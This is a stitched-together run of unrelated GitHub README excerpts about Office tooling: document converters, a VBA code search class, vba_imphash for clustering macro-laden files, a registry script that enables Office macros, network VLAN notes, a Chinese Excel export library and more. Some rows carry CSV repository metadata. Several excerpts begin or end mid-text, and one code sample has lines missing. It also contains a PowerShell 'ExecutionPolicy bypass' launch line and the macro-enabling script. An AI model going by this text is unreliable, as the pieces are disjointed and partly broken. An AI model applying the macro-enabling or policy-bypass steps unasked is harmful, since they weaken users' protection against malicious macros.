3. Most of the file formats are whether too simple and thus not extensible for more advanced uses, or super-heavy and unmanageable because they try to handle all the possible usecases using a specific syntax (Microsoft's OOXML format for instance, mixes content and graphic effects into a bloated XML structure defined by a roughly 5000 pages spec document).

4. Directly related to the precedent statement, those file formats are insanely hard to modify programmatically, or even to visualize, and getting started with them is over complicated. Documentation does not always exist, or APIs are way too complex. This is why proprietary libraries or softwares are used for this purpose.


## Yet another doc format ?

Yes and no. Stumpfi is both a file structuration pattern and and API to manipulate it. Technically, I didn't invent anything : it is just a basic web file that can contain HTML, CSS, Javascript, and any other stuff you can usually find in a web page. I just designed it in order to ensure it has the following properties :

- Content / form dissociation (thank to HTML / CSS)
- Duplicated contents suppression (and thus storage saving)
- Softwares interoperability
- Native support from any OS (you don't need any special app to visualize your document since HTML is natively supported on every OS)
- Simplicity, with a very basic file structuration and a tiny universal API to manipulate it
- Reusability / capitalization of contents, from one app to another
- Extensibility / future proof (since it only uses web technologies)


## Caveat

This doc format is not meant to replace every format that exists. For instance, you won't be able to encode an image, a song, or create a 3D model with stumpfi. It is just particularly useful when creating documents that manipulate basic contents such as videos, songs, images, text, ... (e.g. office apps).

A simple trivia game using JavaScript and jQuery

## Description

[Scrantonicity: The Office Trivia Game](https://xandromus.github.io/scrantonicity/)

![Scrantonicity: The Office Trivia Game](https://xandromus.github.io/responsive-portfolio/assets/images/office.png)

A trivia game based on the NBC TV show The Office. All characters, music, and the name The Office are copyright NBC.

The user is presented with ten trivia questions based on characters and situations from The Office. The questions and answers are in a different order each time the game is played. The user has ten seconds to choose an answer, represented by a timer at the top of the page.

If the user chooses a correct answer, a corresponding message appears, and the image representing the question changes to one representing the answer. The correct answer list item highlights in green and the timer stops before moving to the next question after a few seconds. The tally for correct answers increases by one.

There is a similar change if the user chooses incorrectly, but the correct answer is shown in the display, and both the correct answer and the incorrect user choice list items are highlighted (the latter in red). The tally for incorrect answers increases by one.

If the user does not make a choice before the timer reaches zero, the correct answer is displayed and the correct answer list item is highlighted in green. This counts as an incorrect answer.

At the end of the ten questions, the user is given the option to view their results. The tallies are displayed, and one of three corresponding pictures and messages is shown depending on how many answers were correct. The user then has the option to restart the game and is taken back to the beginning screen.

The theme music plays every time the Dundie icon is clicked, but it only plays once (no looping). There is no option to toggle the music on and off, as it does not loop and only plays with user input.

## Concepts Used

This trivia game builds on the JavaScript and jQuery concepts from previous weeks by adding some important methods:

- `setTimeout()`
- `setInterval()`
- `clearInterval()`

The use of functions within an object was also important to this project. The code for shuffling the questions and answers was taken directly from a Stack Overflow answer.

## Built With

- Sublime Text - Text Editor
- Git Bash

Convert Office (docx, pptx, xlsx) to PDF at scale. 

Support for **custom fonts** to conversion. See the `fonts` folder for supported fonts. Add your own to support even more.

Functions:

* HTTP endpoint
* SQS queue

## Dependencies

* Serverless Framework
* AWS Lambda
* LibreOffice 6.4 Lambda Layer (https://github.com/shelfio/libreoffice-lambda-layer)


## Config

Uses the `serverless-config.dev.json` or the `serverless-config.prod.json` to handle different AWS resources, such as buckets, SQS etc.

Uses SSM Parameter Store (console.aws.amazon.com/systems-manager/parameters) to keep your API-Key safe. Visit the AWS console to setup your parameters.

You have to create `FileProcessor/dev/ApiKey`

## Usage

### HTTP Endpoint

Once deployed, you can hit the api like this:

```bash
curl --location 
--request POST 'https://someurl.execute-api.eu-west-1.amazonaws.com/dev/api/v1/file/convert' \
--header 'X-API-KEY: my-custom-api-key' \
--header 'Content-Type: application/json' \
--data-raw '{
    ""url"": ""https://my-website.com/path/to/doc.pptx""
}'
```

HTTP Response:

```json
{
    ""output_url"": ""https://office-file-processor-dev.s3.eu-west-1.amazonaws.com/conversions/1608127441661/doc.pdf""
}
```

### SQS Event

With SQS Queue we can use much higher processing time for complex documents. 
Secondly we can use SQS to integrate to a service in a private network. 

```bash
{
    ""bucket"": ""office-file-processor-dev"",
    ""key"": ""path/to/doc.pptx""
}
```

Optionally, you can specify the file ACL, and a http callback if you need to communicate to a service with the conversion results. 

```bash
{
    ""bucket"": ""office-file-processor-dev"",
    ""key"": ""path/to/doc.pptx"",
    ""acl"": ""public-read"",
    ""callback_url"": ""https://example.com/your/callback/route?id=123456789""
}
```


## DEPLOYMENT

### Deploy Dev

```bash
serverless deploy --stage dev --verbose
```

### Deploy Production

```bash
serverless deploy --stage prod --verbose
```

A more complex example that uses the spectral forecast equation is related to matrices. A question that can be asked this time would be: given two matrices <i>A</i> and <i>B</i>, what would a third matrix (<i>M</i>) look like if it must resemble both <i>A</i> and <i>B</i> in a certain proportion? For instance, a matrix <i>M</i> may be required to resemble matrix <i>A</i> in a proportion of 60% and matrix <i>B</i> for the remaining proportion of 40%. This is exactly what the spectral equation provides, namely a direct way of obtaining such an intermediary matrix. Moreover, the Spectral Forecast equation can also be applied to signals (one dimension), but also to mathematical objects with more than two dimensions. More projects involving the Spectral Forecast equation can be found in multiple languages [here](https://github.com/Gagniuc?tab=repositories&q=spectral&type=&language=&sort=).

## Purpose

This repo is an example of a class I wrote, that can be used to search the code in a VBA project for a particular word.

The code can search the VBA editor of any Microsoft Office Product (Excel/Access/PowerPoint/Word).

The class can be used to form the basis of your own ""Search VBA"" tool.

The code is useful for finding and documenting hardcoded terms particularly when there are a large number of sheets to search.

## Requirements

You must have the following VBA Project references installed in the VBE Editor reference window (minimum versions stated):

- Visual Basic For Applications
- Microsoft Excel 14.0 Object Library
- OLE Automation
- Microsoft Scripting Runtime
- Microsoft Visual Basic for Applications Extensibility 5.3
- Microsoft Access 14.0 Object Library
- Microsoft PowerPoint 14.0 Object Library
- Microsoft Word 14.0 Object Library

## Caveats

- You only be able to search the VBA code in applications that do not have the VBA editor locked (unfortunately, there is no way to programmatically unlock the VBA editor).
- For some Excel spreadsheets, you will have to make sure that the option “Trust access to the VBA project object model” has been checked. This can be found under the Macro settings option, within Trust Center.

## Implementation

Using the classes in this repo, this is an example of how to search the VBA code in a file called 'TestMacro.xlsm' for the word 'Hello':


    Dim oSearch     As New csSearchVBA
    Dim coResults   As New Collection
    Dim oResult     As csResults
    Dim lRow        As Long
    
    oSearch.addWord ""Hello""
    oSearch.fileName = ""C:\TEST\TestMacro.xlsm""
    Set coResults = oSearch.GetSearchResults
    If Not coResults Is Nothing Then
        lRow = 1
        For Each oResult In coResults
            With Sheet1
                .Cells(lRow, 1).value = oSearch.fileName
                .Cells(lRow, 2).value = oResult.Module
                .Cells(lRow, 3).value = oResult.ProcName
                .Cells(lRow, 4).value = oResult.LineOfCode
                .Cells(lRow, 5).value = oResult.LineNo
                .Cells(lRow, 6).value = oResult.ColumnNo
                .Cells(lRow, 7).value = oResult.ProcStartLineNo
                .Cells(lRow, 8).value = oResult.ProcNumberOfLines
                .Cells(lRow, 9).value = oResult.SearchValue
                lRow = lRow + 1
            End With
        Next
    End If
    
    Set oSearch = Nothing
    Set coResults = Nothing

I was trying to use Office Deployment Tool (ODT) using relative path for our Office 2016 ProPlus deployment (On USB Key & Hard Drive).

As USB Key are mounted each time with different letters depending on how many devices already mounted. I was stuck cause ODT XML Configuration file does not support relative path.

You can see this limitation on this page : [here](https://blogs.technet.microsoft.com/odsupport/2015/09/23/office-365-proplus-2016-couldnt-install-error-30029-1007-0-when-trying-to-install-using-the-office-deployment-tool-odt/)

To run this script on client computers, i'm using this simple launch cmd.

```powershell
powershell.exe -ExecutionPolicy bypass -File .\path\install.ps1

The idea was to read and replace the line with `SourcePath=""Path""` with the current dir. Quick and Dirty.

0x1Avram,vba_imphash,,https://github.com/0x1Avram/vba_imphash,https://api.github.com/repos/vba_imphash/0x1Avram,Imphash equivalent for Office files containing VBA macros.,"# VBA-imphash
Imphash equivalent for Office files containing VBA macros. 

The Python tool can hash and cluster Office files based on the calculated VBA import hashes. 

The hash is calculated based on the order in which import identifiers are stored in an undocumented Office cache found in Office files with VBA macros. The identifiers are stored following the chronological order in which they were added to the VBA project and, in some cases, the identifiers are kept in the cache even if they are deleted from the VBA project.

The tool or its inner workings could be used for clustering, detection, hunting and potentially forensics.


## How it works
The vba_imphash is computed from ""import related"" identifiers extracted from the '_VBA_PROJECT' stream. The '_VBA_PROJECT' stream is an [undocumented stream](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239) found in Office files containing VBA macros. This is a quote often found in Microsoft Office files documentation and in this case as well: *""PerformanceCache (...) MUST be ignored on read. MUST NOT be present on write.""*. 

This stream contains all the identifiers found in the VBA code, such as variable names, function names, APIs and so on. Based on personal observations, these identifiers seem to be stored in a particular order depending on how the document was generated and, in some cases, seem to persist even if the corresponding VBA code is removed. The '_VBA_PROJECT' stream has been demistified thanks to [Dr. Vesselin Bontchev's](https://bontchev.nlcv.bas.bg/) excellent work in [pcodedmp](https://github.com/bontchev/pcodedmp) from which this project uses some functions to extract said identifiers. 

The tool was named **vba_imphash** as it shares similaritiies to [Mandiant's famous imphash](https://www.mandiant.com/resources/blog/tracking-malware-import-hashing). 
In Mandiant's imphash, the order of imports in the IAT table is influenced by the order of the APIs in the source code and the order in which the corresponding object files are passed to the linker.
The vba_imphash leverages the fact that the order in which identifiers are added to the aforementioned PerformanceCache depends on the order in which the VBA developer adds the identifiers in the VBA code.

From the list of all identifiers extracted from an Office file, the tool only selects those that are ""import related"". ""Import related"" identifiers are VBA built-in functions, events, APIs, methods of COM objects commonly used in malicious files and so on. The list of ""import related"" identifiers is found in the 'import_identifiers.json' file from this project.

The list of identifiers was created based on [Microsoft documentation](https://learn.microsoft.com/en-us/office/vba/api/overview/) and malicious files shared by the open source community.

## Examples
How this works is easier to explain with some examples.

**EXAMPLE 1**

We have the following VBA code:
```
Sub subnr1()
    MyHex = Hex(5)
End Sub

Sub subnr2()
    MyChar = Chr(65)
End Sub

Function f3()
    myOct = Oct(4)
    f3 = myOct
End Function

Sub ShowFileInfo4(filespec)
    Dim fs, f, s
    Set fs = CreateObject(""Scripting.FileSystemObject"")
    Set f = fs.GetFile(filespec)
    s = f.DateCreated
    MsgBox s
End Sub

Sub AutoOpen()
    MyNumber = Asc(""A"")
    MsgBox ""test2""
End Sub

```
If a developer copy and pastes this code into a document via the VBA editor offered by the Office suite, from the '_VBA_PROJECT' stream we can extract the following identifiers in this particular order
```
['Word', 'VBA', 'Win16', 'Win32', 'Win64', 'Mac', 'VBA6', 'VBA7', 'Project1', 'stdole', 'Project', 'ThisDocument', '_Evaluate', 'Normal', 'Office', 'subnr1', 'Document', 'MyHex', 'Hex', 'subnr2', 'MyChar', 'Chr', 'f3', 'myOct', 'Oct', 'ShowFileInfo4', 'filespec', 'fs', 's', 'CreateObject', 'GetFile', 'DateCreated', 'MsgBox', 'AutoOpen', 'MyNumber', 'Asc']
```
Notice that the above identifiers include built in functions, variable names, function names and also that in the above list the identifiers order is the same as the order in which they are found in the corresponding source code.

Out of these identifiers and based on the predefined list from 'import_identifiers.json', the following identifiers are considered as ""import related"":
```
['Win16', 'Win32', 'Win64', 'Mac', 'VBA6', 'VBA7', 'Project', 'Normal', 'Hex', 'Chr', 'Oct', 'CreateObject', 'GetFile', 'DateCreated', 'MsgBox', 'AutoOpen', 'Asc']
```
In order to compute the vba_imphash the strings from the above list are concantenated via the '-' character and then md5 hashed, obtaining the vba_imphash *db5e047c270a87c972dae71ef3fbadc1*.
```
Win16-Win32-Win64-Mac-VBA6-VBA7-Project-Normal-Hex-Chr-Oct-CreateObject-GetFile-DateCreated-MsgBox-AutoOpen-Asc
```

**EXAMPLE 2**
Now let's consider a different scenario. If the order of the functions from the VBA code is scrambled as the following:
```
Sub subnr2()
    MyChar = Chr(65)
End Sub

Sub subnr1()
    MyHex = Hex(5)
End Sub

Sub ShowFileInfo4(filespec)
    Dim fs, f, s
    Set fs = CreateObject(""Scripting.FileSystemObject"")
    Set f = fs.GetFile(filespec)
    s = f.DateCreated
    MsgBox s
End Sub

Function f3()
    myOct = Oct(4)
    f3 = myOct
End Function

Sub AutoOpen()
    MyNumber = Asc(""A"")
    MsgBox ""test2""
End Sub

```
If we just copy&paste this code in the VBA editor we get the same identifiers from above, but in a different order and hence a different vba_imphash - *09fb1e28164c8a1745a795697276d840*.

Identifiers:
```
['Word', 'VBA', 'Win16', 'Win32', 'Win64', 'Mac', 'VBA6', 'VBA7', 'Project1', 'stdole', 'Project', 'ThisDocument', '_Evaluate', 'Normal', 'Office', 'subnr2', 'Document', 'MyChar', 'Chr', 'subnr1', 'MyHex', 'Hex', 'ShowFileInfo4', 'filespec', 'fs', 's', 'CreateObject', 'GetFile', 'DateCreated', 'MsgBox', 'f3', 'myOct', 'Oct', 'AutoOpen', 'MyNumber', 'Asc']
```

""Import identifiers"" hashed string:
```
Win16-Win32-Win64-Mac-VBA6-VBA7-Project-Normal-Chr-Hex-CreateObject-GetFile-DateCreated-MsgBox-Oct-AutoOpen-Asc
```

Now for the interesting part, if we keep the same scrambled order as in example 2, but instead of copy&pasting the entire VBA code we add the code sequentially, one function at a time, in the following order: subnr1, subnr2, f3, ShowFileInfo4, AutoOpen, we get the exact same vba_imphash as in example 1, even if the VBA code stored will be identical to example 2.


**EXAMPLE 4**

Perhaps even more interesting is that even deleting part of the VBA macro code only seems to change the order of only a handful of identifiers such as ['Project', 'Normal', 'Office' ,'Document'] that do not affect the ""import identifiers"" list hence the vba_imphash stays the same.
For this example, one can take the document generated in example 1 delete the 'f3' function, and it will get the exact same vba_imphash as in example 1.

**Other observations**

- Even if other VBA code is added to an already existing document, the order of identifiers already existing is preserved.
- Saving an existing document as a new file leads to the reordering of the identifiers. Saving the file from example 3 as a new document leads to the same vba_imphash as the file from example 2.

```

## Setup
Needs Python >= 3.6 as the code uses f-strings. I developed it with Python 3.10. Also uses 7z for extracting OLE stream 'vbaProject.bin' containing macros from [OOXML](https://en.wikipedia.org/wiki/Office_Open_XML) Office files.

**a) Linux**
1) Install 7z

Example from Ubuntu using apt package manager:
```
sudo apt update
sudo apt install p7zip-full
```
After this step you need to be able to run the '7z' command from the terminal.

2) Clone project
```
git clone https://github.com/0x1Avram/vba_imphash.git
```
3) Install dependencies by running this command in the downloaded folder:
```
pip install -r requirements.txt
```
4) Enjoy

**b) Windows**
1) Install 7z

2) Add the installed 7z to 'Path' environment variable.

By default 7z gets installed in ""C:\Program Files\7-Zip\7z.exe"".
After this step you need to be able to run the '7z' command from cmd.

3) Clone project
```
git clone https://github.com/0x1Avram/vba_imphash.git
```
4) Install dependencies by running this command in the downloaded folder:
```
pip install -r requirements.txt
```
5) Enjoy


## Usage
Running the 'vba_imphash.py' script without arguments displays detailed information about the command line options:
```
Usage: 
1) For extracting the vba_imphash and displaying the identifiers for a single file: vba_imphash.py file_path
****Example****: vba_imphash.py ""details 07.20.doc.old""


2) For clustering files based on the computed vba_imphash:
  a) Without creating the clusters on disk: vba_imphash.py unclustered_files_path
  ****Example****: vba_imphash.py ""/home/test/Unclustered files/""

  b) Creating the clusters on disk: vba_imphash.py unclustered_files_path clusters_destination_path
  ****Example****: vba_imphash.py ""/home/test/Unclustered files/"" ""/home/test/Clusters/""


7z needs to be installed and available as a command.
In case the clustering files version of the command line is used, the script creates the following .json files containing relevant information in the current working directory: ""vba_imphash_clusters.json"", ""imphash_identifiers.json"", ""non_imphash_identifiers.json"".
```

brrd,msoconvert,,https://github.com/brrd/msoconvert,https://api.github.com/repos/msoconvert/brrd,Convert Word and Excel documents in Node.js (Windows only),"# msoconvert

Convert Word and Excel documents in Node.js (for Windows only). This is a wrapper around [DocTo](https://github.com/tobya/DocTo).

Microsoft Word/Excel must be installed on the system.

## Installation

```
npm install msoconvert --save
```

## Usage

```javascript
const convert = require(""msoconvert"");

// All the folling options are strings:
convert({ 
  input, // Input file or directory path.
  output, // Output file or directory path.

  // The two following only apply if input is a directory:
  inputExt, // Extension to search for if directory.
  outputExt, // Output extension.

  // Recommended:
  encoding, // Output encoding (see below).

  // Additional options:
  use, // ""word"" (default) | ""excel"" | ""powerpoint""
  format, // wdSaveFormat for output (see below).
  options // Additional arguments passed to docto.exe. Refer to DocTo documentation.
})
  // A promise is returned.
  .then(() => console.log(""done""));
```

See [DocTo documentation](https://github.com/tobya/DocTo) for more information about API and additional parameters.

### `encoding`

Available encodings can be found in `enums/msoencodings.json`. It is possible to avoid the `msoencoding` prefix.

If `encoding` is not defined, msoconvert will use the default encoding defined in MS Office application settings. It is recommended to always define an encoding.

### `format`

`wdSaveFormat` enums:
* https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.word.wdsaveformat
* https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.xlfileformat

If `format` is not defined, msoconvert will try to guess the format from `outputExt` if provided (otherwise an error will be thrown).

This repository is shown some application for operating Office files using Python 3rd batteries, such as xlrd, xlwt, docx and so on.

These .py scripts will obviously increase work efficiency.

## Example

`generation_main.py` is an example (script). Firstly, it reads data from Excel, using information which is collected and organized precisely. Secondly, replaced texts in .docx file. At last, generate numbers of different files with same template.

A simple web app to convert all images in a Word (.docx) or PowerPoint (.pptx)
document to JPEGs, to reduce file size of large documents with uncompressed
images. Everything is done fully in the browser using WebAssembly,
no data is sent elsewhere.

![Screenshot](screenshot.png)

## Building

The frontend of the application is in the `web` directory. Building this with
`npm install && npm build` (or using your package manager of choice) will
compile the WebAssembly module in `wasm_wrapper` using
Rust's build system `cargo`, which must be installed separately.

The main Rust source (in `src`) also contains a binary to perform the same file
operations as the web application. It accepts input via stdin, and writes
output to stdout.

You can run it from this directory using
`cargo run -- < input-file.docx > output-file.docx`.

## What is this?
This script is used to easily configure the enabled state of macros within the Office 365 environment. By default, it reconfigures Outlook, Word, and Excel. It can be easily modified to support other Office 365 applications, or to disable macros instead of enabling them.

It will only configure the currently logged in user. It does *not* lock the variable in this state, meaning the user can just turn it back off if they want.

## 🚀 How do I use?
Run the script, enablemacros.ps1 as System to reconfigure the current user's registry keys to enable Excel/Word macros automatically.

If you want to disable macros, run disablemacros.ps1 as System. Works same as above, but just disables macros instead, w/o notifying.

It is best used with an RMM (Remote monitoring and management) tool that supports Powershell scripting.

## 🔓 What are the security implications?
This script is not for regular users; you should only ever implement this in a specific environment where you are using an outdated application that requires macros always on.

📖 Read more about [how macros are dangerous](https://support.microsoft.com/en-us/office/protect-yourself-from-macro-viruses-a3f3576a-bfef-4d25-84dc-70d18bde5903).

Of course, you can use the alternate script to disable all macros regardless.

## Will this work for ___?
1. Navigate to ""Computer\HKEY_CURRENT_USER\Software\Microsoft\Office\"" within regedit.
2. Check Word, Excel, and Outlook for what versions are present on your machine.
3. If you see ""Computer\HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Security"" then yes.

You can modify the script to support other versions of Office by changing the ""16.0"" to whatever version you need. It's super easy.

As of 6/16/2023, the scripts do work for the Office 365 suite.",1,1,1,0,office,"[ms-excel, ms-office, ms-outlook, ms-word, office, office-365, office-macro, powershell, powershell-script]",0

Downloade die credentials.json von folgender Seite: https://developers.google.com/calendar/quickstart/python

Klicke auf den Button ""Enable the Google Calendar API"" und dann auf ""Download Client Configuration""

Verschiebe die Datei in den gleichen Ordner wie die 3 Scripte.

Starte die run.cmd

# Good to know

1.
Wenn beim Ausführen der run.cmd sich eine Meldung von Outlook mit folgendem Text:

Ein Programm versucht, auf ihre E-Mail-Adressinformationen in Outlook zuzugreifen....

öffnet, muss nach dieser Anleitung das Programm in Trust Center dauerhaft zugelassen werden:

### Get error like `ImportError: DLL load failed while importing win32xxx` when import pywin32 module.

Try this solution:

1. Open a terminal as Administrator
2. Get your virtualenv path by running `poetry env info`
3. Run `poetry run python <virtualenv path>/.venv/Scripts/pywin32_postinstall.py -install`

## Concept

> With the advent of the pandemic, organizations and institutions across the globe were forced to quickly shift to remote work/learning and this lead to the meteoric rise in the usage of platforms like  Zoom,  Google  Meet,  Microsoft  Teams  etc.   
> Incorporation of such platforms into the daily workflows have proven to be monotonous and its impact on one’s mental and physical wellbeing have been a matter of concern.
> The proposed solution implements a close to life environment that reflects the typical day to day activities of offline offices, classrooms etc. 
> * Users can create 2D avatars with which they can walk around a virtual office/classroom and interact with each other and the environment as opposed to being just a tile in a video call like in the existing systems.
> * Users can communicate with each other via Proximity based RTC.
> * We go one step beyond existing systems by providing tools/aids that helps boost user productivity, such as Post it notes, Whiteboards, Timers, Fatigue detection and more.

this repository holds fake 'sensitive' documents that have been created for DreamPort events. These documents are used to populate file shares and endpoints user directories with semi-realistic files that can be used to track audit events, network events etc. There are two basic goals for this project:

1. Create steady stream of files that look like normal business documents
1. Create scripts (e.g. Python) that will create new official looking documents

The best way to think of this repo is a slight customization of the many Microsoft Office template documents thate are available across PowerPoint, Excel and Word. We strive to provide realism for any project or experiment we undertake and these resources are meant to demonstrate this goal.

The following top-level directories are found in this repository:
* files   - holds the actual files that have been created. These are organized by the type of office environment we are trying to emulate.
* scripts - holds scripts that have been created to produce new documents.
* templates - partial documents used to in conjunction with scripts to produce new files

## Logical Network Diagram
  Logical network diagram to follow, showing VLANs and associated endpoint, also to include default route to my ISP and the default route for other VLANs via VPN endpoints.

## Hardware
Below is the hardware I use to run my home network, my network works great for me and my family's needs, and could probably support a small office, or home office if needed.

## Network Explainer

The following tries to explain link types, going forward,  you'll need to understand what a link types and port types are.

### What are the link types?

The link type can be divided into access link and trunk link.

Access link is part of only one VLAN, and normally is for end devices. Any device attached to an access link is unaware of a VLAN membership. An access-link connection can understand only standard Ethernet frames. Switches remove any VLAN information from the frame before it is sent to an access-link device.

Trunk link can carry multiple VLAN traffic and normally is used to connect switches to other switches or to routers or switches to wireless access points.

### What are the port types?

#### Access ports:
- Belongs to one VLAN.
- Usually an Untagged VLAN with the corresponding PVID (Native VLAN in Ubiquti language).
- Commonly used to connect a computer to a ports.

#### Trunk ports:
- Allow multiple VLANs through.
- Receives and sends multiple VLAN packets.
- Typically used for connection switches together or routers and switches or switches and wireless access point.

#### Hybrid ports:
- Allow multiple VLANs through.
- Receive and sends multiple VLAN packets.
- Used for connections between switches, switch to phone to computer (Devices that understand tags) see [802.1Q](https://en.wikipedia.org/wiki/IEEE_802.1Q) on more information on VLAN tagging..

You might grasp an understanding of ports types in following table.

| No | Port Type  | Support Mode          | Common Use Cases       | Comments                             |
|:---|:----------:|:----------------------|:-----------------------|:--------------------------------------|
| 1  | Access     | Single Untagged VLAN  | Switch Port to Device  | Unifi name it ""Native"", other vendors setup Access Ports by untagging the port and setting the PVID (usually using the same VLAN ID)|
| 2  | Trunk      | Single Untagged VLAN + Multiple Tagged VLAN's | Switch to Switch, Hypervisor to Switch | VLAN 1 can be Tagged (Untagged by default) |
| 3  | Hybrid     | Support Untagged VLAN's and Tagged VLAN's | Physical Connection: IP Phone to Network Switch Port & a PC to IP Phones Switch port.| Logical Connection: Voice VLAN as Tagged & Data VLAN as Untagged & Switch port in Trunk mode | * Usually the Untagged VLAN number = Native/Default VLAN number| * Support for multi-Untagged Frames, usually require the use of protocol-based VLANs | * VLAN 1 can be Tagged (Untagged by default) |

```
梨子代码
```
//设置时间格式
ObjectMapper mapper = new ObjectMapper();
SimpleDateFormat myDateFormat = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");
mapper.setDateFormat(myDateFormat);
JiaLiAo.renascence(mapper);

//准备数据

        .boxed()
        .map(i -> {
            UserOrder userOrder = new UserOrder();
            userOrder.setMobile(""1330000"" + i);
            userOrder.setTotalMoney(BigDecimal.valueOf(i));
            userOrder.setTotalOrder(Long.valueOf(i));
            userOrder.setUserName(""user-"" + i);
            userOrder.setCreatedTime(new Date());
            return userOrder;
        })
        .collect(Collectors.toList());
//导出
OutputStream os = new FileOutputStream(""out/userOrder.xlsx"");

                .w(Boolean.TRUE, new FileInputStream(""out/userOrder.xlsx""))
                .q();
```

#### 改变导出Excel的顺序和名称
```JiaLiAo.ExcelCell```的```order```表示字段的顺序（不是index），数字越小越靠前。```value```是字段对应表头的名称。cellType是导出单元格的数据类型，不能保证一定符合
```
@JiaLiAo.ExcelCell(value = ""订单总数"",order = 1,cellType = CellType.NUMERIC)
private Long totalOrder;
```

#### 格式转换
为了少写轮子代码，类型转换借用了Jackson。如果需要转换格式，比如日期、金额。可以使用```renascence```方法改变Jackson的```ObjectMapper```的配置
```
//设置时间格式
ObjectMapper mapper = new ObjectMapper();
SimpleDateFormat myDateFormat = new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"");
mapper.setDateFormat(myDateFormat);
JiaLiAo.renascence(mapper);
```

#### 忽略属性
因为依赖Jackson，所有Jackson的注解都可以用
```
/**
 * 订单总金额
 */
@JsonIgnore
private BigDecimal totalMoney;
```

#### 其他
Jackson的其他骚操作也可以用起来了。

The INNO Setup [^1] Generator for NetOfficeFw[^2] helps to get you started on creating an installer for your NetOfficeFw AddIn. 

This is a command-line application that generates a basic INNO Setup script file for installing a NetOfficeFw COM AddIn for Microsoft Office. The application will load the AddIn DLL file and use reflection to identify all COM visible classes and create the necessary entries in the [Registry] section of the script. The generated script will produce a Setup.exe application that does not require Administrator privileges. All the registry entries for the DLL are created under HKEY_CURRENT_USER for the current user, and the installation folder defaults to a folder created under AppData for the user's Roaming Profile. The script file will also include the necessary files your .DLL depends upon by examing the files in the folder where your .DLL is located.

Make sure that you fill out the properties of your Visual Studio project in the AssemblyInfo.cs file as this tool will utilize those for configuring your INNO Setup script file. 

## Requirements

- The application requires a .NET Framework 4.8 or higher runtime environment.
- The application requires the INNO Setup Compiler to compile the generated script file into a setup.exe file.

## Usage

The application takes three command-line parameters:

- `--addin`: The full path and filename of the .DLL file that implements the COM AddIn.
- `--officeapps`: A semi-colon separated list of Microsoft Office applications that the AddIn supports. The supported applications are Word, Excel, Access, and PowerPoint.
- `--target`: The full path and filename of the INNO Setup script file to generate.

For example, to generate a script file for an AddIn named MyAddIn.dll that supports Word and Excel, you can run the following command:

```
INNOSetupScriptGeneratorForNetOfficeFw.exe --addin ""C:\MyAddIn\bin\Release\MyAddIn.dll"" --officeapps ""Word;Excel"" --target ""C:\MyAddIn\Setup\MyAddIn.iss""
```

You should use the .DLL file that is present in the bin\Release folder under your Visual Studio project for your AddIn for the --addin parameter value when running the app. This will enable the application to pickup all the required dependencies and include them in the [Files] section of the setup script. 

Thank you goes out to Jozef Izso for all his work on NetOfficeFw and NetOfficeFw.BuildTasks!

# About Nuxeo

Nuxeo Platform is an open source Content Services platform, written in Java. Data can be stored in both SQL & NoSQL databases.

The development of the Nuxeo Platform is mostly done by Nuxeo employees with an open development model.

The source code, documentation, roadmap, issue tracker, testing, benchmarks are all public.

Typically, Nuxeo users build different types of information management solutions for [document management](https://www.nuxeo.com/solutions/document-management/), [case management](https://www.nuxeo.com/solutions/case-management/), and [digital asset management](https://www.nuxeo.com/solutions/dam-digital-asset-management/), use cases. It uses schema-flexible metadata & content models that allows content to be repurposed to fulfill future use cases.

# PHPExcelFormatter

PHPExcelFormatter is class to make getting data from Excel documents simpler.

* Read columns what you really need
* Set column names for documents what dosen't have column names on first row
* Set your DB field names for columns
* Retrieve data in array or MySQL query format
* Greate for importing files and then letting user to connect document columns with your DB fields :) (example coming)

## Install

	composer require renekorss/phpexcelformatter

## Usage

```php
// Require needed files
require __DIR__ . '/vendor/autoload.php';

use RKD\PHPExcelFormatter\PHPExcelFormatter;
use RKD\PHPExcelFormatter\Exception\PHPExcelFormatterException;

try {
  // Load file
  $formatter = new PHPExcelFormatter('example1.xls');

  // Output columns array (document must have column names on first row)
  $formatterColumns = array(
    'username' => 'username',
    'phone'    => 'phone_no',
    'email'    => 'email_address'
  );

  // Output columns array (document dosen't have column names on first row)
  // Skip fourth column (age) (third in array), because we don't need that data
  // NOTE: if document dosen't have column names on first line, second parameter for PHPExcelFormatter should be $readColumns = false, otherwise it will skip first line of data
  $formatterColumns = array(
    'username',
    'email_address',
    'phone',
    4 => 'sex'
  );

  // Set our columns
  $formatter->setFormatterColumns($formatterColumns);

  // Output as array
  $output = $formatter->output('a');
  // OR
  // $output = $formatter->output('array');

  // Print array
  echo '<pre>'.print_r($output, true).'</pre>';

  // Set MySQL table
  $formatter->setMySQLTableName('users');

  // Output as mysql query
  $output = $formatter->output('m');
  // OR
  // $output = $formatter->output('mysql');

  // Print mysql query
  echo '<pre>'.print_r($output, true).'</pre>';

} catch (PHPExcelFormatterException $e) {
  echo 'Error: '.$e->getMessage();

**Caution**: The download link is temporary and will be deleted by arbitrary time, so you should download and save it to your storage as quickly as you can.

```typescript
import { convertByFcDocRotary } from ""doc-giggle"";

const { sourceFileUrl, pdfUrl } = await convertByFcDocRotary(
  ""https://your-word/excel/ppt/url""
);
```

## How

There are several backend servers work behind the scene, which use `libreoffice`'s command line to convert the the office document into pdf file.

eric-therond,sharesniff,,https://github.com/eric-therond/sharesniff,https://api.github.com/repos/sharesniff/eric-therond,A tool to do forensics of Office documents,"# Sharesniff

Shareniff is a tool that can be used to:
- detect sensitive data in documents
- to approximate the value of a document
- forensic

It analyzes documents to find strings, called * artifacts *, representative of sensitive data. It is complementary to a tool like grep because it understands among others Office documents (Word, Excel, Outlook, Powerpoint ...).

## Configuration

A config.json file at the root can be set:
- *report_name*: the name of your analysis
- *max_urls*: the max number of urls analyzed when the tool is in web crawling mode
- *strings_artifacts*: specifies the list of artifacts
	- name: the name of the artifact
	- string: the string of characters to recognize (the use of regex is possible)
	- dvs: the digital value score, the sensitivity of the data represented by the string

## Use

```bash
.\sharesniff.ps1 typecrawler path
```

Where typecrawler can be one of the modes of analysis below and path your analysis target.

## Crawlers
### Filesystem

The analysis of a file or file:

```bash
.\sharesniff.ps1 filesystem c:\folder
```

### Sharepoint

The analysis of a Sharepoint site (requires to run sharesniff on Sharepoint Server):

```bash
.\sharesniff.ps1 sharepoint url
```

### Website

Analysis of a website:

```bash
.\sharesniff.ps1 website url
```

## Results

